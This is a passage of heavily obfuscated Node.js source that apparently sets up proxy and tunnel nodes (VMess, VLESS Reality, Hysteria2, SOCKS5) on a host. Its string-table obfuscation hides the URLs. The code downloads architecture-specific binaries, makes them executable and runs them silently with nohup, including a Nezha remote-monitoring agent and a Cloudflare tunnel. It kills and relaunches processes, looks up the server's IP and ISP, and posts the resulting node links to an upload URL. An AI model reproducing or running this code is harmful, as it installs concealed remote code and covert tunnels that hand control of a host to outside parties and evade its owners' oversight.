          hysteriaSettings: { version: 0x2, masquerade: { type: _0x4e407e(0x20a), url: _0x4e407e(_0x332c3f._0x2641b7) } },
          security: 'tls',
          tlsSettings: { alpn: ['h3'], certificates: [{ certificateFile: certPath, keyFile: keyPath }] }
        }
      }),
    isValidPort(S5_PORT) &&
      _0x485ebf['inbounds'][_0x4e407e(0x22f)]({
        tag: _0x4e407e(_0x332c3f._0x355d14),
        listen: '::',
        port: parseInt(S5_PORT),
        protocol: _0x4e407e(_0x332c3f._0x452361),
        settings: {
          auth: _0x4e407e(0x229),
          accounts: [{ user: UUID[_0x4e407e(_0x332c3f._0x2e48eb)](0x0, 0x8), pass: UUID[_0x4e407e(0x1e9)](-0xc) }],
          udp: !![]
        }
      }),
    fs[_0x4e407e(0x183)](path[_0x4e407e(0x237)](FILE_PATH, _0x4e407e(0x17d)), JSON[_0x4e407e(0x193)](_0x485ebf, null, 0x2)))
}
function getSystemArchitecture() {
  const _0x39b627 = { _0x21e9d3: 0x172, _0x1b4036: 0x11c, _0x2c52f4: 0x160 },
    _0x5cc66d = _0x26a414,
    _0x2eb396 = os['arch']()
  return _0x2eb396 === _0x5cc66d(0x11c) || _0x2eb396 === _0x5cc66d(0x1ea) || _0x2eb396 === _0x5cc66d(_0x39b627._0x21e9d3)
    ? _0x5cc66d(_0x39b627._0x1b4036)
    : _0x5cc66d(_0x39b627._0x2c52f4)
}
function downloadFile(_0xee6af1, _0x15c791, _0x2049ca) {
  const _0x2630e0 = { _0x3e42fb: 0x203, _0x122653: 0x231, _0x303600: 0x1bb },
    _0x448a0f = { _0x47c370: 0x149 },
    _0x5db019 = { _0x27f11a: 0x1bc },
    _0x18db59 = { _0x5606e8: 0x1b5, _0x52edd4: 0x130, _0x576abe: 0x1de },
    _0x2a9b2c = _0x26a414,
    _0x3e7f01 = _0xee6af1,
    _0x28d3d1 = _0x3e7f01 + _0x2a9b2c(_0x2630e0._0x3e42fb)
  !fs[_0x2a9b2c(0x1a0)](FILE_PATH) && fs[_0x2a9b2c(0x1c8)](FILE_PATH, { recursive: !![] })
  const _0x4b6418 = fs[_0x2a9b2c(_0x2630e0._0x122653)](_0x28d3d1)
  axios({ method: 'get', url: _0x15c791, responseType: _0x2a9b2c(_0x2630e0._0x303600) })
    [_0x2a9b2c(0x116)]((_0x5c7c29) => {
      const _0x48618c = _0x2a9b2c
      ;(_0x5c7c29[_0x48618c(0x1a1)][_0x48618c(0x1b3)](_0x4b6418),
        _0x4b6418['on']('finish', () => {
          const _0x10f908 = { _0x50bb07: 0x21d, _0x19edae: 0x149, _0x5e2672: 0x1bc, _0x4361e8: 0x1a2, _0x4622f7: 0x1ce },
            _0x2846e8 = _0x48618c
          _0x4b6418[_0x2846e8(0x171)]((_0xdae700) => {
            const _0x28a9b8 = _0x2846e8
            if (_0xdae700) {
              const _0x51a5cc = _0x28a9b8(0x149) + path['basename'](_0x3e7f01) + _0x28a9b8(0x130) + _0xdae700['message']
              ;(fs[_0x28a9b8(0x1b5)](_0x28d3d1, () => {}), console['error'](_0x51a5cc), _0x2049ca(_0x51a5cc))
              return
            }
            try {
              fs[_0x28a9b8(_0x10f908._0x50bb07)](_0x28d3d1, _0x3e7f01)
            } catch (_0x28e0c8) {
              const _0x27d155 = _0x28a9b8(_0x10f908._0x19edae) + path['basename'](_0x3e7f01) + _0x28a9b8(0x130) + _0x28e0c8[_0x28a9b8(0x1de)]
              ;(fs[_0x28a9b8(0x1b5)](_0x28d3d1, () => {}), console[_0x28a9b8(_0x10f908._0x5e2672)](_0x27d155), _0x2049ca(_0x27d155))
              return
            }
            ;(console['log'](_0x28a9b8(_0x10f908._0x19edae) + path[_0x28a9b8(_0x10f908._0x4361e8)](_0x3e7f01) + _0x28a9b8(_0x10f908._0x4622f7)),
              _0x2049ca(null, _0x3e7f01))
          })
        }),
        _0x4b6418['on'](_0x48618c(_0x5db019._0x27f11a), (_0x523e99) => {
          const _0x2bcdb3 = _0x48618c
          fs[_0x2bcdb3(_0x18db59._0x5606e8)](_0x28d3d1, () => {})
          const _0x52b95a =
            _0x2bcdb3(0x149) + path[_0x2bcdb3(0x1a2)](_0x3e7f01) + _0x2bcdb3(_0x18db59._0x52edd4) + _0x523e99[_0x2bcdb3(_0x18db59._0x576abe)]
          ;(console[_0x2bcdb3(0x1bc)](_0x52b95a), _0x2049ca(_0x52b95a))
        }))
    })
    [_0x2a9b2c(0x230)]((_0xc58c1c) => {
      const _0x1d9ad5 = _0x2a9b2c
      fs[_0x1d9ad5(0x1b5)](_0x28d3d1, () => {})
      const _0x3aa59e = _0x1d9ad5(_0x448a0f._0x47c370) + path[_0x1d9ad5(0x1a2)](_0x3e7f01) + '\x20failed:\x20' + _0xc58c1c['message']
      ;(console[_0x1d9ad5(0x1bc)](_0x3aa59e), _0x2049ca(_0x3aa59e))
    })
}
async function downloadFilesAndRun() {
  const _0x3214ff = {
      _0x5ae74e: 0x22a,
      _0x3770ba: 0x1b9,
      _0x48d503: 0x12c,
      _0x1c29f8: 0x15b,
      _0x210557: 0x207,
      _0x307fa2: 0x1f9,
      _0x2bcd6e: 0x173,
      _0x4a0d7f: 0x232,
      _0x19e10a: 0x182,
      _0x17ec3f: 0x183,
      _0x33cbe1: 0x222,
      _0x1468b2: 0x170,
      _0x522d0b: 0x1e7,
      _0x45d035: 0x1ff,
      _0x658de1: 0x204,
      _0x3fa85d: 0x1fb,
      _0x36cc7f: 0x129,
      _0x3e7e5e: 0x138,
      _0x1a7910: 0x1e7,
      _0x326347: 0x125,
      _0x23ed6c: 0x1bc,
      _0x29302b: 0x1a0,
      _0x4ab20a: 0x11b,
      _0x2cb71a: 0x209,
      _0x5bc57e: 0x1ba,
      _0x27b09a: 0x1ba,
      _0x50ae78: 0x20b,
      _0x2207e7: 0x113
    },
    _0x505236 = { _0x1b627c: 0x1a0, _0x3c58b7: 0x15a },
    _0x5972d8 = _0x26a414,
    _0x38c724 = getSystemArchitecture(),
    _0x36646c = getFilesForArchitecture(_0x38c724)
  if (_0x36646c['length'] === 0x0) {
    console['log'](_0x5972d8(_0x3214ff._0x5ae74e))
    return
  }
  const _0x5ba477 = _0x36646c['map']((_0x1d7af5) => {
    const _0x3b3fd5 = { _0x3f246b: 0x159 }
    return new Promise((_0x579e43, _0x4b0b93) => {
      const _0x4ceb26 = (_0x4bd431) => {
        const _0x29f9f7 = { _0x4e11ef: 0x220, _0xe65eff: 0x1e7, _0x603462: 0x20f },
          _0x1b83cb = _0x39c9
        downloadFile(_0x1d7af5[_0x1b83cb(_0x3b3fd5._0x3f246b)], _0x1d7af5[_0x1b83cb(0x220)][_0x4bd431], (_0x5a6621, _0x19cd9d) => {
          const _0x1663f3 = _0x1b83cb
          if (!_0x5a6621) {
            _0x579e43(_0x19cd9d)
            return
          }
          if (_0x4bd431 + 0x1 < _0x1d7af5[_0x1663f3(_0x29f9f7._0x4e11ef)][_0x1663f3(0x169)]) {
            ;(console[_0x1663f3(_0x29f9f7._0xe65eff)](
              _0x1663f3(0x124) + path[_0x1663f3(0x1a2)](_0x1d7af5[_0x1663f3(0x159)]) + _0x1663f3(_0x29f9f7._0x603462)
            ),
              _0x4ceb26(_0x4bd431 + 0x1))
            return
          }
          _0x4b0b93(_0x5a6621)
        })
      }
      _0x4ceb26(0x0)
    })
  })
  try {
    await Promise[_0x5972d8(0x188)](_0x5ba477)
  } catch (_0x115091) {
    console['error'](_0x5972d8(0x121), _0x115091)
    return
  }
  function _0x2103ca(_0x50b387) {
    const _0x2f5dbd = _0x5972d8,
      _0x4c2e39 = 0x1fd
    _0x50b387[_0x2f5dbd(0x162)]((_0xe548a4) => {
      const _0x446bf9 = _0x2f5dbd
      if (fs[_0x446bf9(_0x505236._0x1b627c)](_0xe548a4))
        try {
          ;(fs[_0x446bf9(_0x505236._0x3c58b7)](_0xe548a4, _0x4c2e39),
            console[_0x446bf9(0x1e7)]('Empowerment\x20success\x20for\x20' + _0xe548a4 + ':\x20' + _0x4c2e39[_0x446bf9(0x23a)](0x8)))
        } catch (_0x3876a3) {
          console[_0x446bf9(0x1bc)](_0x446bf9(0x179) + _0xe548a4 + ':\x20' + _0x3876a3)
        }
    })
  }
  const _0x3be8ff = NEZHA_PORT ? [npmPath, webPath, botPath] : [phpPath, webPath, botPath]
  _0x2103ca(_0x3be8ff)
  if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      const _0x42f3c5 = NEZHA_SERVER[_0x5972d8(0x1d0)](':') ? NEZHA_SERVER[_0x5972d8(_0x3214ff._0x3770ba)](':')['pop']() : '',
        _0x2fe35b = new Set([
          _0x5972d8(0x1d7),
          _0x5972d8(_0x3214ff._0x48d503),
          _0x5972d8(_0x3214ff._0x1c29f8),
          '2087',
          _0x5972d8(0x129),
          _0x5972d8(_0x3214ff._0x210557)
        ]),
        _0x4ecb3b = _0x2fe35b[_0x5972d8(0x1d4)](_0x42f3c5) ? _0x5972d8(_0x3214ff._0x307fa2) : _0x5972d8(_0x3214ff._0x2bcd6e),
        _0x4317ed =
          _0x5972d8(0x211) +
          NEZHA_KEY +
          _0x5972d8(_0x3214ff._0x4a0d7f) +
          NEZHA_SERVER +
          _0x5972d8(_0x3214ff._0x19e10a) +
          _0x4ecb3b +
          '\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20' +
          UUID
      fs[_0x5972d8(_0x3214ff._0x17ec3f)](path['join'](FILE_PATH, 'config.yaml'), _0x4317ed)
      const _0x355085 = 'nohup\x20' + phpPath + _0x5972d8(_0x3214ff._0x33cbe1) + FILE_PATH + _0x5972d8(_0x3214ff._0x1468b2)
      try {
        ;(await exec(_0x355085),
          console[_0x5972d8(_0x3214ff._0x522d0b)](phpName + _0x5972d8(_0x3214ff._0x45d035)),
          await new Promise((_0x32b777) => setTimeout(_0x32b777, 0x3e8)))
      } catch (_0xb423e3) {
        console[_0x5972d8(0x1bc)](_0x5972d8(_0x3214ff._0x658de1) + _0xb423e3)
      }
    } else {
      let _0x144e84 = ''
      const _0x2b4201 = [
        '443',
        '8443',
        _0x5972d8(_0x3214ff._0x1c29f8),
        _0x5972d8(_0x3214ff._0x3fa85d),
        _0x5972d8(_0x3214ff._0x36cc7f),
        _0x5972d8(0x207)
      ]
      _0x2b4201[_0x5972d8(0x1d0)](NEZHA_PORT) && (_0x144e84 = '--tls')
      const _0x1193e2 =
        'nohup\x20' +
        npmPath +
        _0x5972d8(_0x3214ff._0x3e7e5e) +
        NEZHA_SERVER +
        ':' +
        NEZHA_PORT +
        _0x5972d8(0x1e4) +
        NEZHA_KEY +
        '\x20' +
        _0x144e84 +
        _0x5972d8(0x23c)
      try {
        ;(await exec(_0x1193e2),
          console['log'](npmName + _0x5972d8(_0x3214ff._0x45d035)),
          await new Promise((_0x35432d) => setTimeout(_0x35432d, 0x3e8)))
      } catch (_0x440aba) {
        console[_0x5972d8(0x1bc)](_0x5972d8(0x17a) + _0x440aba)
      }
    }
  } else console[_0x5972d8(_0x3214ff._0x1a7910)]('NEZHA\x20variable\x20is\x20empty,skip\x20running')
  const _0x501b8c = _0x5972d8(0x112) + webPath + _0x5972d8(_0x3214ff._0x326347) + FILE_PATH + '/config.json\x20>/dev/null\x202>&1\x20&'
  try {
    ;(await exec(_0x501b8c), console[_0x5972d8(0x1e7)](webName + _0x5972d8(0x1ff)), await new Promise((_0xcde15d) => setTimeout(_0xcde15d, 0x3e8)))
  } catch (_0x262d9a) {
    console[_0x5972d8(_0x3214ff._0x23ed6c)](_0x5972d8(0x202) + _0x262d9a)
  }
  if (fs[_0x5972d8(_0x3214ff._0x29302b)](botPath)) {
    let _0x5028a5
    if (ARGO_AUTH[_0x5972d8(0x209)](/^[A-Z0-9a-z=]{120,250}$/)) _0x5028a5 = _0x5972d8(_0x3214ff._0x4ab20a) + ARGO_AUTH
    else
      ARGO_AUTH[_0x5972d8(_0x3214ff._0x2cb71a)](/TunnelSecret/)
        ? (_0x5028a5 = _0x5972d8(0x215) + path[_0x5972d8(_0x3214ff._0x5bc57e)](FILE_PATH, _0x5972d8(0x146)) + _0x5972d8(0x196))
        : (_0x5028a5 = _0x5972d8(0x1dd) + path[_0x5972d8(_0x3214ff._0x27b09a)](bootLogPath) + _0x5972d8(0x195) + ARGO_PORT)
    try {
      ;(await exec(_0x5972d8(_0x3214ff._0x50ae78) + path[_0x5972d8(0x1ba)](botPath) + '\x22\x20' + _0x5028a5 + _0x5972d8(0x21e)),
        console[_0x5972d8(_0x3214ff._0x1a7910)](botName + _0x5972d8(0x1ff)),
        await new Promise((_0xd22d6) => setTimeout(_0xd22d6, 0x7d0)))
    } catch (_0x5af45c) {
      console[_0x5972d8(0x1bc)](_0x5972d8(_0x3214ff._0x2207e7) + _0x5af45c)
    }
  }
  await new Promise((_0xa4475d) => setTimeout(_0xa4475d, 0x1388))
}
function getFilesForArchitecture(_0xf29afa) {
  const _0x10f382 = { _0x341219: 0x11c, _0x22431d: 0x20d, _0x17073e: 0x154, _0x30095a: 0x1c4, _0x467185: 0x127, _0x1fe3e0: 0x122 },
    _0x5f572f = _0x26a414,
    _0x50a84f = _0xf29afa === _0x5f572f(0x11c) ? _0x5f572f(0x14b) : _0x5f572f(0x144),
    _0x3b2588 = _0xf29afa === _0x5f572f(_0x10f382._0x341219) ? _0x5f572f(_0x10f382._0x22431d) : _0x5f572f(_0x10f382._0x17073e),
    _0x212167 = [
      { fileName: webPath, fileUrls: [_0x50a84f + _0x5f572f(_0x10f382._0x30095a), _0x3b2588 + _0x5f572f(0x1c4)] },
      { fileName: botPath, fileUrls: [_0x50a84f + '/bot', _0x3b2588 + _0x5f572f(_0x10f382._0x467185)] }
    ]
  return (
    NEZHA_SERVER &&
      NEZHA_KEY &&
      (NEZHA_PORT
        ? _0x212167['unshift']({ fileName: npmPath, fileUrls: [_0x50a84f + '/agent', _0x3b2588 + _0x5f572f(0x191)] })
        : _0x212167[_0x5f572f(0x136)]({ fileName: phpPath, fileUrls: [_0x50a84f + '/v1', _0x3b2588 + _0x5f572f(_0x10f382._0x1fe3e0)] })),
    _0x212167
  )
}
function argoType() {
  const _0x23187c = { _0x2269df: 0x1e7, _0x2cd9e5: 0x199, _0x41b92e: 0x183, _0x1de311: 0x16d, _0x49fb64: 0x1eb, _0x29b04f: 0x15c, _0x5d7afc: 0x237 },
    _0x4a8e16 = _0x26a414
  if (!ARGO_AUTH || !ARGO_DOMAIN) {
    console[_0x4a8e16(_0x23187c._0x2269df)](_0x4a8e16(_0x23187c._0x2cd9e5))
    return
  }
  if (ARGO_AUTH['includes'](_0x4a8e16(0x187))) {
    fs[_0x4a8e16(_0x23187c._0x41b92e)](path[_0x4a8e16(0x237)](FILE_PATH, _0x4a8e16(0x16d)), ARGO_AUTH)
    const _0x22c7c3 =
      _0x4a8e16(0x176) +
      ARGO_AUTH[_0x4a8e16(0x1b9)]('\x22')[0xb] +
      '\x0a\x20\x20credentials-file:\x20' +
      path['join'](FILE_PATH, _0x4a8e16(_0x23187c._0x1de311)) +
      _0x4a8e16(_0x23187c._0x49fb64) +
      ARGO_DOMAIN +
      '\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:' +
      ARGO_PORT +
      _0x4a8e16(_0x23187c._0x29b04f)
    fs[_0x4a8e16(0x183)](path[_0x4a8e16(_0x23187c._0x5d7afc)](FILE_PATH, _0x4a8e16(0x146)), _0x22c7c3)
  } else console['log'](_0x4a8e16(0x1b0) + ARGO_PORT + _0x4a8e16(0x1e2))
}
async function waitForQuickTunnelLog(_0x252f56 = 0x7530) {
  const _0x5f407f = { _0x182741: 0x1e8, _0x3a3a38: 0x1a0, _0x3fc9c7: 0x18f },
    _0x1f4c33 = _0x26a414,
    _0x5b2b88 = Date[_0x1f4c33(0x1e8)]() + _0x252f56
  while (Date[_0x1f4c33(_0x5f407f._0x182741)]() < _0x5b2b88) {
    try {
      if (fs[_0x1f4c33(_0x5f407f._0x3a3a38)](bootLogPath)) {
        const _0x4e0d35 = fs['readFileSync'](bootLogPath, _0x1f4c33(0x14a))
        if (/trycloudflare\.com/[_0x1f4c33(_0x5f407f._0x3fc9c7)](_0x4e0d35)) return _0x4e0d35
      }
    } catch (_0x351153) {}
    await new Promise((_0x68c5b2) => setTimeout(_0x68c5b2, 0x3e8))
  }
  return ''
}
async function extractDomains() {
  const _0x3dfa11 = {
      _0x77b45a: 0x1e7,
      _0x29982d: 0x169,
      _0x1a4bfb: 0x1c5,
      _0x5e8b9c: 0x11d,
      _0x502c9e: 0x1d6,
      _0x8922d: 0x1dd,
      _0x50f5a9: 0x1ba,
      _0x392721: 0x1ba,
      _0xb612ef: 0x21e,
      _0x468812: 0x1e7,
      _0x454c41: 0x1bc,
      _0x12379c: 0x113
    },
    _0x400347 = { _0x568c28: 0x177, _0x156e08: 0x219 },
    _0x36a2aa = { _0x3c276b: 0x22f },
    _0xa8f485 = _0x26a414
  let _0x17320e
  if (ARGO_AUTH && ARGO_DOMAIN)
    ((_0x17320e = ARGO_DOMAIN), console[_0xa8f485(_0x3dfa11._0x77b45a)](_0xa8f485(0x14e), _0x17320e), await generateLinks(_0x17320e))
  else
    try {
      const _0x5a0ed6 = await waitForQuickTunnelLog(),
        _0x5cd14e = _0x5a0ed6[_0xa8f485(0x1b9)]('\x0a'),
        _0x40857e = []
      _0x5cd14e[_0xa8f485(0x162)]((_0x551213) => {
        const _0x1f5c59 = _0xa8f485,
          _0x5b245e = _0x551213[_0x1f5c59(0x209)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/)
        if (_0x5b245e) {
          const _0x77a260 = _0x5b245e[0x1]
          _0x40857e[_0x1f5c59(_0x36a2aa._0x3c276b)](_0x77a260)
        }
      })
      if (_0x40857e[_0xa8f485(_0x3dfa11._0x29982d)] > 0x0)
        ((_0x17320e = _0x40857e[0x0]), console[_0xa8f485(0x1e7)](_0xa8f485(_0x3dfa11._0x1a4bfb), _0x17320e), await generateLinks(_0x17320e))
      else {
        ;(console[_0xa8f485(0x1e7)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),
          fs[_0xa8f485(_0x3dfa11._0x5e8b9c)](path[_0xa8f485(0x237)](FILE_PATH, _0xa8f485(_0x3dfa11._0x502c9e))))
        async function _0x5dafbd() {
          const _0x2b7ab5 = _0xa8f485
          try {
            process[_0x2b7ab5(_0x400347._0x568c28)] === 'win32'
              ? await exec(_0x2b7ab5(0x131) + botName + '.exe\x20>\x20nul\x202>&1')
              : await exec(
                  _0x2b7ab5(0x1fd) +
                    botName[_0x2b7ab5(_0x400347._0x156e08)](0x0) +
                    ']' +
                    botName[_0x2b7ab5(0x1f2)](0x1) +
                    '\x22\x20>\x20/dev/null\x202>&1'
                )
          } catch (_0x183ca3) {}
        }
        ;(_0x5dafbd(), await new Promise((_0x8f5196) => setTimeout(_0x8f5196, 0xbb8)))
        const _0x53026b = _0xa8f485(_0x3dfa11._0x8922d) + path[_0xa8f485(_0x3dfa11._0x50f5a9)](bootLogPath) + _0xa8f485(0x195) + ARGO_PORT
        try {
          ;(await exec('nohup\x20\x22' + path[_0xa8f485(_0x3dfa11._0x392721)](botPath) + '\x22\x20' + _0x53026b + _0xa8f485(_0x3dfa11._0xb612ef)),
            console[_0xa8f485(_0x3dfa11._0x468812)](botName + _0xa8f485(0x1ff)),
            await new Promise((_0x343384) => setTimeout(_0x343384, 0x1770)),
            await extractDomains())
        } catch (_0x585dc9) {
          console[_0xa8f485(_0x3dfa11._0x454c41)](_0xa8f485(_0x3dfa11._0x12379c) + _0x585dc9)
        }
      }
    } catch (_0xb2df5a) {
      console[_0xa8f485(_0x3dfa11._0x454c41)](_0xa8f485(0x13f), _0xb2df5a)
    }
}
async function getMetaInfo() {
  const _0x2e3a7b = {
      _0x677277: 0x198,
      _0x316261: 0x1a1,
      _0x35c5c8: 0x13b,
      _0xd46de7: 0x214,
      _0x1f0272: 0x198,
      _0xcae123: 0x1a1,
      _0x2cd084: 0x1a1,
      _0x59a22d: 0x126
    },
    _0x2df291 = _0x26a414
  try {
    const _0x21d5cc = await axios[_0x2df291(0x166)]('https://api.ip.sb/geoip', {
      headers: { 'User-Agent': _0x2df291(_0x2e3a7b._0x677277), timeout: 0xbb8 }
    })
    if (_0x21d5cc[_0x2df291(_0x2e3a7b._0x316261)] && _0x21d5cc[_0x2df291(_0x2e3a7b._0x316261)]['country_code'] && _0x21d5cc['data']['isp'])
      return (_0x21d5cc[_0x2df291(0x1a1)][_0x2df291(_0x2e3a7b._0x35c5c8)] + '-' + _0x21d5cc['data']['isp'])[_0x2df291(_0x2e3a7b._0xd46de7)](
        /\s+/g,
        '_'
      )
  } catch (_0x267c0d) {
    try {
      const _0x4b32a6 = await axios['get'](_0x2df291(0x1b6), { headers: { 'User-Agent': _0x2df291(_0x2e3a7b._0x1f0272), timeout: 0xbb8 } })
      if (
        _0x4b32a6[_0x2df291(0x1a1)] &&
        _0x4b32a6[_0x2df291(_0x2e3a7b._0xcae123)]['status'] === _0x2df291(0x128) &&
        _0x4b32a6[_0x2df291(_0x2e3a7b._0x2cd084)][_0x2df291(0x126)] &&
        _0x4b32a6[_0x2df291(0x1a1)]['org']
      )
        return (_0x4b32a6[_0x2df291(_0x2e3a7b._0x316261)][_0x2df291(_0x2e3a7b._0x59a22d)] + '-' + _0x4b32a6['data'][_0x2df291(0x21b)])[
          _0x2df291(_0x2e3a7b._0xd46de7)
        ](/\s+/g, '_')
    } catch (_0x1ff9ac) {}
  }
  return _0x2df291(0x1a5)
}
async function getServerIP() {
  const _0x41f749 = { _0x3c23dc: 0x143, _0x106d4a: 0x226, _0x2895ba: 0x143, _0x481e7a: 0x143, _0x59e27a: 0x227 },
    _0x53df54 = _0x26a414
  let _0x47ead8 = ''
  try {
    const _0x17bed2 = await axios['get'](_0x53df54(0x189), { timeout: 0xbb8 })
    _0x47ead8 = _0x17bed2[_0x53df54(0x1a1)][_0x53df54(_0x41f749._0x3c23dc)]()
  } catch (_0x85e8ff) {
    try {
      _0x47ead8 = execSync(_0x53df54(0x1cf))[_0x53df54(0x23a)]()[_0x53df54(_0x41f749._0x3c23dc)]()
    } catch (_0x1ec4db) {
      try {
        const _0x281717 = await axios[_0x53df54(0x166)](_0x53df54(_0x41f749._0x106d4a), { timeout: 0xbb8 })
        _0x47ead8 = '[' + _0x281717['data'][_0x53df54(_0x41f749._0x2895ba)]() + ']'
      } catch (_0x230bbd) {
        try {
          _0x47ead8 = '[' + execSync(_0x53df54(0x22d))['toString']()[_0x53df54(_0x41f749._0x481e7a)]() + ']'
        } catch (_0xa08faa) {
          console[_0x53df54(0x1bc)](_0x53df54(_0x41f749._0x59e27a), _0xa08faa['message'])
        }
      }
    }
  }
  return _0x47ead8
}
async function generateLinks(_0x525224) {
  const _0x5c85e5 = {
      _0x440aa2: 0x11f,
      _0x3a81ac: 0x12a,
      _0x4fb14d: 0x1b4,
      _0x584e31: 0x1b1,
      _0x28a558: 0x1ef,
      _0x553684: 0x193,
      _0x4b1d7e: 0x13e,
      _0x4fa799: 0x132,
      _0x2c61e5: 0x1ef,
      _0x129bed: 0x181,
      _0xf71b0: 0x16a,
      _0x1ee271: 0x1a3,
      _0xc2cad4: 0x1e9,
      _0x40b081: 0x224,
      _0x201a7b: 0x23a,
      _0xed03d1: 0x17b,
      _0x2b932a: 0x1f6,
      _0x55e6b8: 0x135
    },
    _0x55f16d = await getMetaInfo(),
    _0x82d5d2 = NAME ? NAME + '-' + _0x55f16d : _0x55f16d,
    _0x2aa6fd = await getServerIP()
  return new Promise((_0x4b74fb) => {
    setTimeout(() => {
      const _0x5e79bf = _0x39c9,
        _0x562a80 = {
          v: '2',
          ps: '' + _0x82d5d2,
          add: CFIP,
          port: CFPORT,
          id: UUID,
          aid: '0',
          scy: _0x5e79bf(0x21c),
          net: 'ws',
          type: _0x5e79bf(_0x5c85e5._0x440aa2),
          host: _0x525224,
          path: _0x5e79bf(0x153),
          tls: _0x5e79bf(_0x5c85e5._0x3a81ac),
          sni: _0x525224,
          alpn: '',
          fp: 'firefox'
        }
      let _0x2e7eb5 =
        _0x5e79bf(_0x5c85e5._0x4fb14d) +
        UUID +
        '@' +
        CFIP +
        ':' +
        CFPORT +
        _0x5e79bf(_0x5c85e5._0x584e31) +
        _0x525224 +
        _0x5e79bf(_0x5c85e5._0x28a558) +
        _0x525224 +
        _0x5e79bf(0x1be) +
        _0x82d5d2 +
        '\x0a\x0avmess://' +
        Buffer[_0x5e79bf(0x17b)](JSON[_0x5e79bf(_0x5c85e5._0x553684)](_0x562a80))['toString'](_0x5e79bf(0x224)) +
        _0x5e79bf(_0x5c85e5._0x4b1d7e) +
        UUID +
        '@' +
        CFIP +
        ':' +
        CFPORT +
        _0x5e79bf(_0x5c85e5._0x4fa799) +
        _0x525224 +
        _0x5e79bf(_0x5c85e5._0x2c61e5) +
        _0x525224 +
        _0x5e79bf(_0x5c85e5._0x129bed) +
        _0x82d5d2 +
        '\x0a\x20\x20\x20\x20'
      if (isValidPort(HY2_PORT)) {
        const _0x1a1323 = getCertificateFingerprint(certPath),
          _0x49fb18 = _0x1a1323 ? _0x5e79bf(_0x5c85e5._0xf71b0) + encodeURIComponent(_0x1a1323) : '',
          _0x58f903 =
            _0x5e79bf(_0x5c85e5._0x1ee271) +
            UUID +
            '@' +
            _0x2aa6fd +
            ':' +
            HY2_PORT +
            '/?sni=www.bing.com&insecure=0&alpn=h3&obfs=none' +
            _0x49fb18 +
            '#' +
            _0x82d5d2
        _0x2e7eb5 += _0x58f903
      }
      if (isValidPort(REALITY_PORT)) {
        const _0x279768 =
          _0x5e79bf(0x1b4) +
          UUID +
          '@' +
          _0x2aa6fd +
          ':' +
          REALITY_PORT +
          '?encryption=none&flow=xtls-rprx-vision&security=reality&sni=www.iij.ad.jp&fp=firefox&pbk=' +
          publicKey +
          '&type=tcp&headerType=none#' +
          _0x82d5d2
        _0x2e7eb5 += _0x279768
      }
      if (isValidPort(S5_PORT)) {
        const _0x17eb47 = Buffer['from'](UUID[_0x5e79bf(0x1f2)](0x0, 0x8) + ':' + UUID[_0x5e79bf(_0x5c85e5._0xc2cad4)](-0xc))[_0x5e79bf(0x23a)](
            _0x5e79bf(_0x5c85e5._0x40b081)
          ),
          _0x22a8d5 = _0x5e79bf(0x1cd) + _0x17eb47 + '@' + _0x2aa6fd + ':' + S5_PORT + '#' + _0x82d5d2
        _0x2e7eb5 += _0x22a8d5
      }
      ;(console[_0x5e79bf(0x1e7)](Buffer['from'](_0x2e7eb5)[_0x5e79bf(_0x5c85e5._0x201a7b)](_0x5e79bf(_0x5c85e5._0x40b081))),
        fs['writeFileSync'](subPath, Buffer[_0x5e79bf(_0x5c85e5._0xed03d1)](_0x2e7eb5)[_0x5e79bf(0x23a)](_0x5e79bf(_0x5c85e5._0x40b081))),
        fs['writeFileSync'](listPath, _0x2e7eb5, _0x5e79bf(_0x5c85e5._0x2b932a)),
        console[_0x5e79bf(0x1e7)](FILE_PATH + _0x5e79bf(_0x5c85e5._0x55e6b8)),
        (subContent = Buffer['from'](_0x2e7eb5)[_0x5e79bf(0x23a)]('base64')),
        uploadNodes(),
        _0x4b74fb(_0x2e7eb5))
    }, 0x7d0)
  })
}
async function uploadNodes() {
  const _0x20cae5 = { _0x20931b: 0x18a, _0x14c582: 0x156, _0x10c732: 0x15f, _0x22a59a: 0x169, _0x51ccaa: 0x193, _0x5182ed: 0x14c, _0x422afb: 0x1e7 },
    _0x10cd9a = _0x26a414
  if (UPLOAD_URL && PROJECT_URL) {
    const _0x477e7d = PROJECT_URL + '/' + SUB_PATH,
      _0x388a4f = { subscription: [_0x477e7d] }
    try {
      const _0x350186 = await axios[_0x10cd9a(0x14c)](UPLOAD_URL + _0x10cd9a(0x123), _0x388a4f, { headers: { 'Content-Type': 'application/json' } })
      return _0x350186 && _0x350186[_0x10cd9a(_0x20cae5._0x20931b)] === 0xc8 ? (console['log'](_0x10cd9a(_0x20cae5._0x14c582)), _0x350186) : null
    } catch (_0x3cb3c7) {
      if (_0x3cb3c7['response']) {
        if (_0x3cb3c7[_0x10cd9a(0x1c2)]['status'] === 0x190) {
        }
      }
    }
  } else {
    if (UPLOAD_URL) {
      if (!fs['existsSync'](listPath)) return
      const _0x490eb0 = fs[_0x10cd9a(_0x20cae5._0x10c732)](listPath, 'utf-8'),
        _0x45f4de = _0x490eb0[_0x10cd9a(0x1b9)]('\x0a')[_0x10cd9a(0x1a8)]((_0x146033) =>
          /(vless|vmess|trojan|hysteria2|socks):\/\//['test'](_0x146033)
        )
      if (_0x45f4de[_0x10cd9a(_0x20cae5._0x22a59a)] === 0x0) return
      const _0x5a8298 = JSON[_0x10cd9a(_0x20cae5._0x51ccaa)]({ nodes: _0x45f4de })
      try {
        const _0x4ac022 = await axios[_0x10cd9a(_0x20cae5._0x5182ed)](UPLOAD_URL + _0x10cd9a(0x147), _0x5a8298, {
          headers: { 'Content-Type': 'application/json' }
        })
        return _0x4ac022 && _0x4ac022['status'] === 0xc8
          ? (console[_0x10cd9a(_0x20cae5._0x422afb)]('Nodes\x20uploaded\x20successfully'), _0x4ac022)
          : null
      } catch (_0x30c092) {
        return null
      }
    } else return
  }
}
function cleanFiles() {
  const _0x3dc3ee = { _0x1160bb: 0x22f, _0x33f071: 0x22f, _0x59b225: 0x177, _0x487bac: 0x1d2 }
  setTimeout(() => {
    const _0x544084 = { _0x312178: 0x19d, _0x96a6c7: 0x137, _0x41456a: 0x1e7 },
      _0x1ed4dd = { _0x57a3fd: 0x137, _0x4927d9: 0x1e7, _0x31d0b1: 0x18c },
      _0x163d14 = _0x39c9,
